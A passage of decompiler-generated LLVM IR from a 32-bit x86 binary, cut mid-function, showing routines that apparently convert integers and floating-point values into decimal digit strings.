  store i32 %v1_80549b1, i32* %v3_80549b1, align 4
  %v0_80549b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80549b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80549b3 = add i32 %v1_80549b3, 4
  %v3_80549b3 = inttoptr i32 %v2_80549b3 to i32*
  store i32 %v0_80549b3, i32* %v3_80549b3, align 4
  br label %dec_label_pc_80549c7

dec_label_pc_80549b8:                             ; preds = %dec_label_pc_80549a9
  %v6_80549b8 = icmp eq i32 %tmp6, 512
  %v1_80549be = icmp eq i1 %v6_80549b8, false
  br i1 %v1_80549be, label %dec_label_pc_80549c5, label %dec_label_pc_80549c0

dec_label_pc_80549c0:                             ; preds = %dec_label_pc_80549b8
  store i16 %v4_8054995, i16* %tmp5, align 2
  br label %dec_label_pc_80549c7

dec_label_pc_80549c5:                             ; preds = %dec_label_pc_80549b8
  %sext3 = mul i32 %tmp4, 65536
  %v1_80549c5 = sdiv i32 %sext3, 65536
  %v3_80549c5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80549c5, i32* %v3_80549c5, align 4
  br label %dec_label_pc_80549c7

dec_label_pc_80549c7:                             ; preds = %dec_label_pc_80549c0, %dec_label_pc_80549b1, %dec_label_pc_80549a5, %dec_label_pc_80549c5
  %v2_80549c7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80549c7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80549c8 = sdiv i32 %sext, 65536
  ret i32 %v1_80549c8

; uselistorder directives
  uselistorder label %dec_label_pc_80549c7, { 3, 0, 1, 2 }
}

define i32 @function_80549cc(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80549cc:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80549d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80549d7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80549e3 = icmp slt i32 %arg4, 0
  %v1_80549e5 = icmp eq i1 %v2_80549e3, false
  br i1 %v1_80549e5, label %dec_label_pc_8054a06, label %dec_label_pc_80549e7

dec_label_pc_80549e7:                             ; preds = %dec_label_pc_80549cc
  %v1_80549e7 = sub i32 0, %arg4
  store i32 %v1_80549e7, i32* %esi.global-to-local, align 4
  %v2_80549e9 = icmp slt i32 %arg3, 0
  %v1_80549eb = icmp eq i1 %v2_80549e9, false
  br i1 %v1_80549eb, label %dec_label_pc_8054a06, label %dec_label_pc_80549ed

dec_label_pc_80549ed:                             ; preds = %dec_label_pc_80549e7
  %v1_80549ed = sub i32 0, %arg2
  %v5_80549ed = icmp ne i32 %arg2, 0
  store i32 %v1_80549ed, i32* %ecx.global-to-local, align 4
  %v2_80549ef = zext i1 %v5_80549ed to i32
  %v3_80549ef = add i32 %v2_80549ef, %arg3
  %v1_80549f2 = sub i32 0, %v3_80549ef
  store i32 %v1_80549f2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054a06

dec_label_pc_8054a06:                             ; preds = %dec_label_pc_80549cc, %dec_label_pc_80549e7, %dec_label_pc_80549ed
  %v0_8054a0b = phi i32 [ %v1_80549e7, %dec_label_pc_80549ed ], [ %v1_80549e7, %dec_label_pc_80549e7 ], [ %arg4, %dec_label_pc_80549cc ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_80549ed ], [ 0, %dec_label_pc_80549e7 ], [ 0, %dec_label_pc_80549cc ]
  %div = udiv i32 -1, %v0_8054a0b
  %tmp30 = urem i32 -1, %v0_8054a0b
  store i8 0, i8* %arg1, align 1
  %v1_8054a10 = add i32 %tmp30, 1
  %v1_8054a11 = load i32, i32* %esi.global-to-local, align 4
  %v12_8054a11 = icmp eq i32 %v1_8054a10, %v1_8054a11
  %v1_8054a1b = icmp eq i1 %v12_8054a11, false
  br i1 %v1_8054a1b, label %dec_label_pc_8054a2a, label %dec_label_pc_8054a1d

dec_label_pc_8054a1d:                             ; preds = %dec_label_pc_8054a06
  %v1_8054a1d = add i32 %div, 1
  br label %dec_label_pc_8054a2a

dec_label_pc_8054a2a:                             ; preds = %dec_label_pc_8054a06, %dec_label_pc_8054a1d
  %stack_var_-20.0.off0 = phi i32 [ %v1_8054a10, %dec_label_pc_8054a06 ], [ 0, %dec_label_pc_8054a1d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8054a06 ], [ %v1_8054a1d, %dec_label_pc_8054a1d ]
  %v0_8054a2a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8054a2a, i32* %ebp.global-to-local, align 4
  %v0_8054a2c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054a2c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054a30

dec_label_pc_8054a30:                             ; preds = %dec_label_pc_8054a7e, %dec_label_pc_8054a2a
  %v0_8054a67 = phi i32 [ %v0_8054a80, %dec_label_pc_8054a7e ], [ %v0_8054a2a, %dec_label_pc_8054a2a ]
  %v0_8054a34 = phi i32 [ %v1_8054a82, %dec_label_pc_8054a7e ], [ %v0_8054a2c, %dec_label_pc_8054a2a ]
  %v1_8054a30 = icmp eq i32 %v0_8054a34, 0
  br i1 %v1_8054a30, label %dec_label_pc_8054a67, label %dec_label_pc_8054a34

dec_label_pc_8054a34:                             ; preds = %dec_label_pc_8054a30
  %v0_8054a38 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8054a34, %v0_8054a38
  %tmp31 = urem i32 %v0_8054a34, %v0_8054a38
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8054a67, %v0_8054a38
  %tmp32 = urem i32 %v0_8054a67, %v0_8054a38
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8054a4b = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8054a4f = add i32 %tmp32, %v6_8054a4b
  %v8_8054a55 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8054a5a = add i32 %div7, %v8_8054a55
  store i32 %v2_8054a5a, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8054a4f, %v0_8054a38
  %tmp33 = urem i32 %v2_8054a4f, %v0_8054a38
  %v2_8054a62 = add i32 %div8, %v2_8054a5a
  br label %dec_label_pc_8054a6f

dec_label_pc_8054a67:                             ; preds = %dec_label_pc_8054a30
  %v0_8054a6b = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8054a67, %v0_8054a6b
  %tmp34 = urem i32 %v0_8054a67, %v0_8054a6b
  br label %dec_label_pc_8054a6f

dec_label_pc_8054a6f:                             ; preds = %dec_label_pc_8054a34, %dec_label_pc_8054a67
  %v13_8054a75 = phi i32 [ %tmp33, %dec_label_pc_8054a34 ], [ %tmp34, %dec_label_pc_8054a67 ]
  %storemerge = phi i32 [ %v2_8054a62, %dec_label_pc_8054a34 ], [ %div10, %dec_label_pc_8054a67 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8054a6f = load i32, i32* %edi.global-to-local, align 4
  %v1_8054a6f = add i32 %v0_8054a6f, -1
  store i32 %v1_8054a6f, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8054a75, 10
  br i1 %tmp, label %dec_label_pc_8054a75, label %dec_label_pc_8054a7a

dec_label_pc_8054a75:                             ; preds = %dec_label_pc_8054a6f
  %v2_8054a75 = add i32 %v13_8054a75, 48
  %v12_8054a75 = and i32 %v2_8054a75, 255
  %v14_8054a75 = and i32 %v13_8054a75, -256
  %v15_8054a75 = or i32 %v12_8054a75, %v14_8054a75
  br label %dec_label_pc_8054a7e

dec_label_pc_8054a7a:                             ; preds = %dec_label_pc_8054a6f
  %v6_8054a7a = add i32 %v13_8054a75, %arg5
  %v21_8054a7a = and i32 %v6_8054a7a, 255
  %v23_8054a7a = and i32 %v13_8054a75, -256
  %v24_8054a7a = or i32 %v21_8054a7a, %v23_8054a7a
  br label %dec_label_pc_8054a7e

dec_label_pc_8054a7e:                             ; preds = %dec_label_pc_8054a75, %dec_label_pc_8054a7a
  %storemerge9 = phi i32 [ %v15_8054a75, %dec_label_pc_8054a75 ], [ %v24_8054a7a, %dec_label_pc_8054a7a ]
  %v1_8054a7e = trunc i32 %storemerge9 to i8
  %v3_8054a7e = inttoptr i32 %v1_8054a6f to i8*
  store i8 %v1_8054a7e, i8* %v3_8054a7e, align 1
  %v0_8054a80 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054a82 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054a82 = or i32 %v1_8054a82, %v0_8054a80
  %v3_8054a82 = icmp eq i32 %v2_8054a82, 0
  %v1_8054a84 = icmp eq i1 %v3_8054a82, false
  br i1 %v1_8054a84, label %dec_label_pc_8054a30, label %dec_label_pc_8054a86

dec_label_pc_8054a86:                             ; preds = %dec_label_pc_8054a7e
  %v4_8054a86 = icmp eq i32 %storemerge11, 0
  br i1 %v4_8054a86, label %dec_label_pc_8054a91, label %dec_label_pc_8054a8d

dec_label_pc_8054a8d:                             ; preds = %dec_label_pc_8054a86
  %v0_8054a8d = load i32, i32* %edi.global-to-local, align 4
  %v1_8054a8d = add i32 %v0_8054a8d, -1
  store i32 %v1_8054a8d, i32* %edi.global-to-local, align 4
  %v1_8054a8e = inttoptr i32 %v1_8054a8d to i8*
  store i8 45, i8* %v1_8054a8e, align 1
  br label %dec_label_pc_8054a91

dec_label_pc_8054a91:                             ; preds = %dec_label_pc_8054a86, %dec_label_pc_8054a8d
  %v0_8054a94 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054a94

; uselistorder directives
  uselistorder i32 %v13_8054a75, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8054a4f, { 1, 0 }
  uselistorder i32 %v0_8054a38, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8054a34, { 1, 0, 2 }
  uselistorder i32 %v0_8054a67, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8054a10, { 1, 0 }
  uselistorder i32 %v0_8054a0b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054a91, { 1, 0 }
  uselistorder label %dec_label_pc_8054a7e, { 1, 0 }
  uselistorder label %dec_label_pc_8054a6f, { 1, 0 }
  uselistorder label %dec_label_pc_8054a2a, { 1, 0 }
  uselistorder label %dec_label_pc_8054a06, { 2, 1, 0 }
}

define i32 @function_8054a9c() local_unnamed_addr {
dec_label_pc_8054a9c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp145 = call i16 @__decompiler_undefined_function_1()
  %tmp154 = call x86_fp80 @__decompiler_undefined_function_11()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054a9d = load i32, i32* @edi, align 4
  %v0_8054a9e = load i32, i32* @esi, align 4
  %v0_8054a9f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a9f, i32* %stack_var_-16, align 4
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v4_8054ab4 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8054ab4 = add i3 %v4_8054ab4, -1
  store x86_fp80 %tmp154, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8054ab4, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054abb = add i32 %tmp155, 4
  %v2_8054abb = inttoptr i32 %v1_8054abb to i32*
  %v3_8054abb = load i32, i32* %v2_8054abb, align 4
  store i32 %v3_8054abb, i32* %eax.global-to-local, align 4
  %v1_8054ac2 = add i32 %tmp155, 8
  %v2_8054ac2 = inttoptr i32 %v1_8054ac2 to i8*
  %v3_8054ac2 = load i8, i8* %v2_8054ac2, align 1
  %v4_8054ac2 = zext i8 %v3_8054ac2 to i32
  %v6_8054ac2 = and i32 %v0_8054a9f, -256
  %v7_8054ac2 = or i32 %v4_8054ac2, %v6_8054ac2
  store i32 %v7_8054ac2, i32* %ebx.global-to-local, align 4
  %v1_8054ac5 = inttoptr i32 %tmp155 to i32*
  %v2_8054ac5 = load i32, i32* %v1_8054ac5, align 4
  store i32 %v2_8054ac5, i32* %ebp.global-to-local, align 4
  %v2_8054ad1 = or i8 %v3_8054ac2, 32
  %v7_8054ad1 = zext i8 %v2_8054ad1 to i32
  %v9_8054ad1 = and i32 %v3_8054abb, -256
  %v10_8054ad1 = or i32 %v7_8054ad1, %v9_8054ad1
  store i32 %v10_8054ad1, i32* %eax.global-to-local, align 4
  %v10_8054ad3 = icmp eq i8 %v2_8054ad1, 97
  %v1_8054ad9 = icmp eq i1 %v10_8054ad3, false
  br i1 %v1_8054ad9, label %dec_label_pc_8054ae2, label %dec_label_pc_8054adb

dec_label_pc_8054adb:                             ; preds = %dec_label_pc_8054a9c
  %v2_8054adb = add i8 %v3_8054ac2, 6
  %v15_8054adb = zext i8 %v2_8054adb to i32
  %v18_8054adb = or i32 %v15_8054adb, %v6_8054ac2
  store i32 %v18_8054adb, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ae2

dec_label_pc_8054ae2:                             ; preds = %dec_label_pc_8054a9c, %dec_label_pc_8054adb
  %stack_var_-207.0 = phi i8 [ %v3_8054ac2, %dec_label_pc_8054a9c ], [ %v2_8054adb, %dec_label_pc_8054adb ]
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v2_8054ae9 = icmp slt i32 %v2_8054ac5, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8054af8 = select i1 %v2_8054ae9, i32 6, i32 %v2_8054ac5
  store i32 %v3_8054af8, i32* %ebp.global-to-local, align 4
  %v1_8054afb = add i32 %tmp155, 12
  %v2_8054afb = inttoptr i32 %v1_8054afb to i32*
  %v3_8054afb = load i32, i32* %v2_8054afb, align 4
  store i32 %v3_8054afb, i32* %eax.global-to-local, align 4
  %v2_8054afe = and i32 %v3_8054afb, 2
  %v3_8054afe = icmp eq i32 %v2_8054afe, 0
  br i1 %v3_8054afe, label %dec_label_pc_8054b0c, label %dec_label_pc_8054b18

dec_label_pc_8054b0c:                             ; preds = %dec_label_pc_8054ae2
  %v2_8054b0c = urem i32 %v3_8054afb, 2
  %tmp191 = trunc i32 %v2_8054b0c to i8
  %tmp = sub nsw i8 0, %tmp191
  %tmp192 = and i8 %tmp, 32
  br label %dec_label_pc_8054b18

dec_label_pc_8054b18:                             ; preds = %dec_label_pc_8054b0c, %dec_label_pc_8054ae2
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8054ae2 ], [ %tmp192, %dec_label_pc_8054b0c ]
  %not.v5_8054b18 = fcmp uno x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v5_8054b18, label %dec_label_pc_8054b8f, label %dec_label_pc_8054b3a

dec_label_pc_8054b3a:                             ; preds = %dec_label_pc_8054b18
  %v1_8054b3a = add i3 %v4_8054ab4, -2
  store i3 %v1_8054b3a, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp154, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8054b3e = fcmp ogt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v4_8054b3e, label %bb, label %bb179

bb:                                               ; preds = %dec_label_pc_8054b3a
  br label %dec_label_pc_8054bca

bb179:                                            ; preds = %dec_label_pc_8054b3a
  %v5_8054b3e = fcmp olt x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %v5_8054b3e, label %bb180, label %dec_label_pc_8054b42

bb180:                                            ; preds = %bb179
  br label %dec_label_pc_8054bca

dec_label_pc_8054b42:                             ; preds = %bb179
  %not.v4_8054b3c = fcmp une x86_fp80 %tmp154, 0xK00000000000000000000
  br i1 %not.v4_8054b3c, label %dec_label_pc_8054bca, label %dec_label_pc_8054c5f

dec_label_pc_8054b8f:                             ; preds = %dec_label_pc_8054b18
  store i3 %v4_8054ab4, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp155, i32* %ebx.global-to-local, align 4
  %v1_8054b96 = add i32 %tmp155, 16
  %v2_8054b96 = inttoptr i32 %v1_8054b96 to i32*
  store i32 32, i32* %v2_8054b96, align 4
  %v4_8054b9d = add i8 %stack_var_-207.0, -96
  %v6_8054b9d = sub i8 95, %stack_var_-207.0
  %v7_8054b9d = and i8 %v6_8054b9d, %stack_var_-207.0
  %v8_8054b9d = icmp slt i8 %v7_8054b9d, 0
  %v9_8054b9d = icmp eq i8 %v4_8054b9d, 0
  %v10_8054b9d = icmp slt i8 %v4_8054b9d, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8054bb2 = icmp eq i1 %v10_8054b9d, %v8_8054b9d
  %v4_8054bb2 = icmp eq i1 %v9_8054b9d, false
  %v5_8054bb2 = and i1 %v4_8054bb2, %v3_8054bb2
  br i1 %v5_8054bb2, label %dec_label_pc_8054bb9, label %dec_label_pc_8054bb4

dec_label_pc_8054bb4:                             ; preds = %dec_label_pc_8054b8f
  br label %dec_label_pc_8054bb9

dec_label_pc_8054bb9:                             ; preds = %dec_label_pc_8054b8f, %dec_label_pc_8054bb4
  %v2_8054bc1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054bc1, i32* @ecx, align 4
  br label %dec_label_pc_8054f8a

dec_label_pc_8054bca:                             ; preds = %dec_label_pc_8054b42, %bb180, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8054be4 = xor i3 %v4_8054ab4, -4
  store i3 %v3_8054be4, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8054bea

dec_label_pc_8054bea:                             ; preds = %dec_label_pc_8054c3b, %dec_label_pc_8054bca
  %v0_8054c3b = phi i32 [ 4096, %dec_label_pc_8054bca ], [ %v2_8054c3b, %dec_label_pc_8054c3b ]
  %v2_8054bed = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054bca ], [ %v2_8054bed80, %dec_label_pc_8054c3b ]
  %v1_8054c25 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8054bca ], [ %v0_8054bea78, %dec_label_pc_8054c3b ]
  %v0_8054c3765 = phi i32 [ 13, %dec_label_pc_8054bca ], [ %v1_8054bec, %dec_label_pc_8054c3b ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8054bca ], [ %stack_var_-220.1, %dec_label_pc_8054c3b ]
  %v1_8054bec = add i32 %v0_8054c3765, -1
  %v4_8054bed = fcmp ule x86_fp80 %v1_8054c25, %v2_8054bed
  br i1 %v4_8054bed, label %dec_label_pc_8054c14, label %dec_label_pc_8054bf1

dec_label_pc_8054bf1:                             ; preds = %dec_label_pc_8054bea
  store x86_fp80 %v1_8054c25, x86_fp80* %st0.global-to-local, align 4
  %v3_8054bf3 = mul i32 %v1_8054bec, 12
  store i32 %v3_8054bf3, i32* %eax.global-to-local, align 4
  %v1_8054bf6 = add i32 %v3_8054bf3, ptrtoint (x86_fp80** @global_var_805d340.395 to i32)
  %v2_8054bf6 = inttoptr i32 %v1_8054bf6 to x86_fp80*
  %v3_8054bf6 = load x86_fp80, x86_fp80* %v2_8054bf6, align 4
  %v4_8054bfc = fmul x86_fp80 %v1_8054c25, %v3_8054bf6
  store x86_fp80 %v4_8054bfc, x86_fp80* %st1.global-to-local, align 4
  %v4_8054c00 = fcmp ule x86_fp80 %v4_8054bfc, %v3_8054bf6
  br i1 %v4_8054c00, label %dec_label_pc_8054c35, label %dec_label_pc_8054c04

dec_label_pc_8054c04:                             ; preds = %dec_label_pc_8054bf1
  store x86_fp80 %v4_8054bfc, x86_fp80* %st1.global-to-local, align 4
  %v5_8054c0e = sub i32 %stack_var_-220.0, %v0_8054c3b
  br label %dec_label_pc_8054c37

dec_label_pc_8054c14:                             ; preds = %dec_label_pc_8054bea
  %v3_8054c14 = mul i32 %v1_8054bec, 12
  store i32 %v3_8054c14, i32* %eax.global-to-local, align 4
  %v1_8054c17 = add i32 %v3_8054c14, ptrtoint (x86_fp80** @global_var_805d340.395 to i32)
  %v2_8054c17 = inttoptr i32 %v1_8054c17 to x86_fp80*
  %v3_8054c17 = load x86_fp80, x86_fp80* %v2_8054c17, align 4
  %v4_8054c1d = fdiv x86_fp80 %v3_8054c17, %v1_8054c25
  store x86_fp80 %v4_8054c1d, x86_fp80* %st1.global-to-local, align 4
  %v4_8054c1f = fcmp ogt x86_fp80 %v3_8054c17, %v1_8054c25
  br i1 %v4_8054c1f, label %.thread54, label %bb182

.thread54:                                        ; preds = %dec_label_pc_8054c14
  store x86_fp80 %v3_8054c17, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054c25

bb182:                                            ; preds = %dec_label_pc_8054c14
  %v5_8054c1f = fcmp olt x86_fp80 %v3_8054c17, %v1_8054c25
  br i1 %v5_8054c1f, label %.thread50, label %bb183

.thread50:                                        ; preds = %bb182
  store x86_fp80 %v3_8054c17, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054c35

bb183:                                            ; preds = %bb182
  %not.v6_8054c1f = fcmp une x86_fp80 %v3_8054c17, %v1_8054c25
  store x86_fp80 %v3_8054c17, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8054c1f, label %dec_label_pc_8054c35, label %dec_label_pc_8054c25

dec_label_pc_8054c25:                             ; preds = %.thread54, %bb183
  store x86_fp80 %v3_8054c17, x86_fp80* %st1.global-to-local, align 4
  %v5_8054c2f = add i32 %stack_var_-220.0, %v0_8054c3b
  br label %dec_label_pc_8054c37

dec_label_pc_8054c35:                             ; preds = %dec_label_pc_8054bf1, %.thread50, %bb183
  %v1_8054c35 = phi x86_fp80 [ %v1_8054c25, %.thread50 ], [ %v1_8054c25, %bb183 ], [ %v3_8054bf6, %dec_label_pc_8054bf1 ]
  %v0_8054bea79 = phi x86_fp80 [ %v3_8054c17, %.thread50 ], [ %v3_8054c17, %bb183 ], [ %v4_8054bfc, %dec_label_pc_8054bf1 ]
  store x86_fp80 %v1_8054c35, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054c37

dec_label_pc_8054c37:                             ; preds = %dec_label_pc_8054c25, %dec_label_pc_8054c04, %dec_label_pc_8054c35
  %v2_8054bed80 = phi x86_fp80 [ %v1_8054c35, %dec_label_pc_8054c35 ], [ %v2_8054bed, %dec_label_pc_8054c25 ], [ %v1_8054c25, %dec_label_pc_8054c04 ]
  %v0_8054bea78 = phi x86_fp80 [ %v0_8054bea79, %dec_label_pc_8054c35 ], [ %v3_8054c17, %dec_label_pc_8054c25 ], [ %v4_8054bfc, %dec_label_pc_8054c04 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8054c35 ], [ %v5_8054c2f, %dec_label_pc_8054c25 ], [ %v5_8054c0e, %dec_label_pc_8054c04 ]
  %v1_8054c37 = icmp eq i32 %v1_8054bec, 0
  br i1 %v1_8054c37, label %.thread59, label %dec_label_pc_8054c3b

dec_label_pc_8054c3b:                             ; preds = %dec_label_pc_8054c37
  %v2_8054c3b = sdiv i32 %v0_8054c3b, 2
  store i32 %v2_8054c3b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054bea

.thread59:                                        ; preds = %dec_label_pc_8054c37
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8054c5f

dec_label_pc_8054c5f:                             ; preds = %dec_label_pc_8054b42, %.thread59
  %v0_8054d19 = phi i32 [ %stack_var_-220.1, %.thread59 ], [ -1, %dec_label_pc_8054b42 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread59 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8054b42 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8054c63 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8054b3a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8054c76 = and i32 %v2_8054c63, -65536
  %v1_8054c7b = udiv i16 %tmp145, 256
  %v2_8054c7b = zext i16 %v1_8054c7b to i32
  %v3_8054c7b = or i32 %v2_8054c7b, 12
  %v10_8054c7b = mul nuw nsw i32 %v3_8054c7b, 256
  %tmp193 = urem i16 %tmp145, 256
  %v4_8054c76.masked = zext i16 %tmp193 to i32
  %v11_8054c7b = or i32 %v10_8054c7b, %v4_8054c76.masked
  %v12_8054c7b = or i32 %v11_8054c7b, %v6_8054c76
  store i32 %v12_8054c7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054c83

dec_label_pc_8054c83:                             ; preds = %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge, %dec_label_pc_8054c5f
  %v2_8054ca8 = phi x86_fp80 [ %storemerge, %dec_label_pc_8054c5f ], [ %v2_8054ca8.pre, %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge ]
  %v1_8054c83 = phi i3 [ %v1_8054b3a, %dec_label_pc_8054c5f ], [ %v1_8054c83.pre, %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge ]
  %v3_8054caa = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054c5f ], [ %v0_8054c83.pre, %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8054c63, %dec_label_pc_8054c5f ], [ %v4_8054ca3, %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp194 = fptosi x86_fp80 %v3_8054caa to i32
  store i32 %tmp194, i32* %eax.global-to-local, align 4
  store i32 %tmp194, i32* %ecx.global-to-local, align 4
  %v5_8054c9d = sitofp i32 %tmp194 to x86_fp80
  %v4_8054ca3 = add i32 %stack_var_-212.0, 9
  %v4_8054ca8 = fsub x86_fp80 %v2_8054ca8, %v5_8054c9d
  store i3 %v1_8054c83, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054caa = fmul x86_fp80 %v3_8054caa, %v4_8054ca8
  store x86_fp80 %v4_8054caa, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054cac

dec_label_pc_8054cac:                             ; preds = %dec_label_pc_8054cac.dec_label_pc_8054cac_crit_edge, %dec_label_pc_8054c83
  %v0_8054cc0 = phi i32 [ %v0_8054cc0.pre, %dec_label_pc_8054cac.dec_label_pc_8054cac_crit_edge ], [ %tmp194, %dec_label_pc_8054c83 ]
  %v0_8054cb0 = phi i32 [ %v0_8054cb0.pre, %dec_label_pc_8054cac.dec_label_pc_8054cac_crit_edge ], [ 0, %dec_label_pc_8054c83 ]
  %v1_8054cb0 = add i32 %v0_8054cb0, 1
  store i32 %v1_8054cb0, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8054cba = sub i32 %v4_8054ca3, %v1_8054cb0
  %div = udiv i32 %v0_8054cc0, 10
  %tmp184 = urem i32 %v0_8054cc0, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8054cc6 = and i32 %div, 536870656
  store i32 %v2_8054cba, i32* %edx.global-to-local, align 4
  %v1_8054ccc = trunc i32 %tmp184 to i8
  %v2_8054ccc = or i8 %v1_8054ccc, 48
  %v12_8054ccc = zext i8 %v2_8054ccc to i32
  %v15_8054ccc = or i32 %v12_8054ccc, %v3_8054cc6
  store i32 %v15_8054ccc, i32* %eax.global-to-local, align 4
  %v3_8054cd1 = inttoptr i32 %v2_8054cba to i8*
  store i8 %v2_8054ccc, i8* %v3_8054cd1, align 1
  %v7_8054cd3 = icmp sgt i32 %v1_8054cb0, 8
